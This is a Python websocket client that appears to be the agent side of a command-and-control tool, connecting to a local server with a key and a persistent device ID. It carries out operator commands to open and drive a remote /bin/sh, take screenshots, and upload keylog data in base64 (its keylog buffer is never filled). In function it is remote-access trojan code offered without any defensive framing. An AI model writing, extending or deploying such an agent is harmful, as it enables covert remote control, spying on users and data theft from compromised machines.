import asyncio
import websockets
import json
import base64
import time

URI     = "ws://127.0.0.1:3000/ws"
ID_FILE = ".device_id"
WS_KEY  = "your_ws_key_from_db_here"
FORMAT  = "csv"

CAPS = [
    "ping",
    "shell_open", "shell_write", "shell_read", "shell_kill",
    "keylog_start", "keylog_stop",
    "screenshot",
]

# ── Keylog state ──────────────────────────────────────────────────────────────

class KeylogState:
    def __init__(self):
        self.buffer    = ""
        self.running   = False
        self.interval  = 5        # 0 = instant
        self.last_flush = time.monotonic()

    def should_flush(self) -> bool:
        return (
            len(self.buffer) >= 100
            or (self.interval > 0 and time.monotonic() - self.last_flush >= self.interval)
            or (self.interval == 0 and len(self.buffer) > 0)
        )

    def take(self) -> str:
        chunk = self.buffer
        self.buffer = ""
        self.last_flush = time.monotonic()
        return chunk

keylog = KeylogState()

async def keylog_loop(ws):
    """Runs concurrently — flushes buffer based on interval or size."""
    while keylog.running:
        sleep_for = 0.05 if keylog.interval == 0 else min(keylog.interval, 1)
        await asyncio.sleep(sleep_for)

        if keylog.should_flush():
            chunk = keylog.take()
            if chunk:
                b64 = base64.b64encode(chunk.encode()).decode()
                await ws.send(f"EVENT keylog {b64}")
                print(f"[keylog] Flushed {len(chunk)} chars")

# ── Shell state ───────────────────────────────────────────────────────────────

shell_proc = None

async def shell_open() -> str:
    global shell_proc
    import subprocess
    shell_proc = subprocess.Popen(
        ["/bin/sh"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    return "CMD_OK"

async def shell_write(b64_input: str) -> str:
    if shell_proc is None:
        return "CMD_FAIL not_found"
    try:
        shell_proc.stdin.write(base64.b64decode(b64_input))
        shell_proc.stdin.flush()
        return "CMD_OK"
    except Exception:
        return "CMD_FAIL internal_error"

async def shell_read() -> str:
    if shell_proc is None:
        return "CMD_FAIL not_found"
    try:
        import select
        ready, _, _ = select.select([shell_proc.stdout], [], [], 0.2)
        if ready:
            data = shell_proc.stdout.read1(4096)
            return "CMD_OK " + base64.b64encode(data).decode()
        return "CMD_OK"
    except Exception:
        return "CMD_FAIL internal_error"

async def shell_kill() -> str:
    global shell_proc
    if shell_proc is None:
        return "CMD_FAIL not_found"
    shell_proc.terminate()
    shell_proc = None
    return "CMD_OK"

# ── Command handler ───────────────────────────────────────────────────────────

async def handle_command(ws, raw: str):
    parts   = raw.split(" ", 2)
    command = parts[1] if len(parts) > 1 else ""
    arg     = parts[2] if len(parts) > 2 else ""

    if command == "ping":
        await ws.send("CMD_OK pong")

    elif command == "caps":
        await ws.send("CMD_OK " + ";".join(CAPS))

    elif command == "shell_open":
        await ws.send(await shell_open())

    elif command == "shell_write":
        await ws.send(await shell_write(arg))

    elif command == "shell_read":
        await ws.send(await shell_read())

    elif command == "shell_kill":
        await ws.send(await shell_kill())

    elif command == "keylog_start":
        try:
            keylog.interval = int(arg)
        except ValueError:
            await ws.send("CMD_FAIL invalid_args")
            return
        if not keylog.running:
            keylog.running = True
            asyncio.create_task(keylog_loop(ws))
        await ws.send("CMD_OK")

    elif command == "keylog_stop":
        keylog.running = False
        # flush remaining buffer before stopping
        chunk = keylog.take()
        if chunk:
            b64 = base64.b64encode(chunk.encode()).decode()
            await ws.send(f"EVENT keylog {b64}")
        await ws.send("CMD_OK")

    elif command == "screenshot":
        try:
            import subprocess
            subprocess.run(["scrot", "-o", "/tmp/_sc.png"], check=True)
            with open("/tmp/_sc.png", "rb") as f:
                b64 = base64.b64encode(f.read()).decode()
            await ws.send(f"CMD_OK {b64}")
        except Exception:
            await ws.send("CMD_FAIL internal_error")

    else:
        await ws.send("CMD_FAIL unknown_command")

# ── Persistence ───────────────────────────────────────────────────────────────

def load_device_id() -> str:
    try:
        with open(ID_FILE) as f: return f.read().strip()
    except FileNotFoundError:
        return "NEW"

def save_device_id(did: str):
    with open(ID_FILE, "w") as f: f.write(did)

# ── Handshake ─────────────────────────────────────────────────────────────────

async def handshake(ws) -> str | None:
    await ws.send(f"HELLO {WS_KEY}")
    if (await ws.recv()).strip() != "HELLO_OK":
        return None
    print("[+] HELLO_OK")

    await ws.send(f"FORMAT {FORMAT}")
    if (await ws.recv()).strip() != "FORMAT_OK":
        return None
    print("[+] FORMAT_OK")

    device_id = load_device_id()
    await ws.send(f"IDENT {device_id}")
    resp = (await ws.recv()).strip()
    if not resp.startswith("IDENT_OK"):
        if resp == "IDENT_FAIL":
            import os
            try: os.remove(ID_FILE)
            except FileNotFoundError: pass
        return None
    assigned = resp.split(" ", 1)[1]
    save_device_id(assigned)
    print(f"[+] IDENT_OK {assigned}")

    caps_cmd = (await ws.recv()).strip()
    if caps_cmd != "CMD caps":
        return None
    await ws.send("CMD_OK " + ";".join(CAPS))
    print(f"[+] Caps sent")

    return assigned

# ── Main ──────────────────────────────────────────────────────────────────────

async def main():
    async with websockets.connect(URI) as ws:
        device_id = await handshake(ws)
        if not device_id:
            print("[!] Handshake failed")
            return
        print(f"[*] Ready — device {device_id}")

        async for message in ws:
            message = message.strip()
            if message.startswith("CMD "):
                await handle_command(ws, message)

if __name__ == "__main__":
    asyncio.run(main())
